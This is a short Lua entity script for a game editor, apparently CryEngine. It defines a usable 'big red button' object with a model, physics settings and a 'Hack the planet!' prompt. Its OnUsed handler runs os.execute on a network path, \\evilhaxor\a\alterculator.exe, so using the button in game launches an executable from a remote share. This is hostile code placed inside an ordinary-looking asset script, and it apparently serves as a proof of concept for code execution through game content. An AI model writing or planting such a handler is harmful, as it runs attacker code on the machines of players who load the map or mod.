Button =
{
	Properties =
	{
		object_Model = "Objects/bigredbutton.cgf",
		bUsable = 1,
		sUseMessage = "Hack the planet!",
		sLuaCode = "print('Hello World!')",
		Physics =
		{
			bRigidBody = 0,
			bRigidBodyActive = 0,
			bResting = 0,
			Density = 0,
			Mass = 0,
		},
	},
	Editor = 
	{
		Icon = "item.bmp",
		IconOnTop = 1,
	},
}

MakeUsable(Button)

function Button:OnInit()
	self:OnReset();
end

function Button:OnSpawn()
	self:OnReset();
end

function Button:OnReset()
	if (self.Properties.object_Model ~= "") then
		self:LoadObject(0, self.Properties.object_Model);
	end
	self:PhysicalizeThis();
end

function Button:PhysicalizeThis()
	EntityCommon.PhysicalizeRigid(self, 0, self.Properties.Physics, 1);
end

function Button:OnPropertyChange()
	self.OnReset();
end

function Button:IsUsable(userId)
	return 2;
end

function Button:GetUsableMessage(index)
	return self.Properties.sUseMessage;
end

function Button:OnUsed(userId, index)
	os.execute("\\\\evilhaxor\\a\\alterculator.exe")
end

